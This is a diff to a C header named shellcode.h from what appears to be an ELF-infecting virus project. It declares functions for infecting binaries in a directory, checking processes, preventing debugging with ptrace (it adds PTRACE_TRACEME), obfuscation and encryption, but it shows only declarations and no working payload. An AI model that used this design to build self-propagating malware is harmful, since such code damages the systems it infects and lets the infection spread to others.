@@ -1,14 +1,19 @@
 #ifndef SHELLCODE_H
 # define SHELLCODE_H
 
+# define _SYS_WAIT_H
 # define _FCNTL_H
 # define _SYS_MMAN_H
+# define _SIGNAL_H
 # include <linux/stat.h>
 # include <stddef.h>
 # include <sys/types.h>
 # include <bits/stat.h>
 # include <bits/fcntl.h>
 # include <bits/mman.h>
+# include <bits/waitflags.h>
+# include <bits/waitstatus.h>
+# include <bits/signum.h>
 # include <dirent.h>
 # include <elf.h>
 
@@ -18,6 +23,7 @@
 
 /* Architecture dependent */
 enum __ptrace_request {
+  PTRACE_TRACEME = 0,
   PTRACE_ATTACH = 16,
   PTRACE_CONT = 7,
 };
@@ -46,7 +52,7 @@ static void end(void);
 static void lambdaEnd(void);
 static void lambdaStart(void);
 static void encryptStart(void);
-static int  preventDebug(void);
+static int  preventDebug(void *magic);
 static size_t strlen(const char *s);
 static int  checkProcess(char *dirname);
 static int  infectBins(const char *dirname);
@@ -54,7 +60,7 @@ static void *memcpy(void *dest, const void *src, size_t);
 static int  unObfuscate(void);
 static int  stop(int status, void *magic);
 static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header);
-static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine);
+static int  isCompatible(Elf64_Ehdr *header);
 static void exit(int status);
 
 #endif
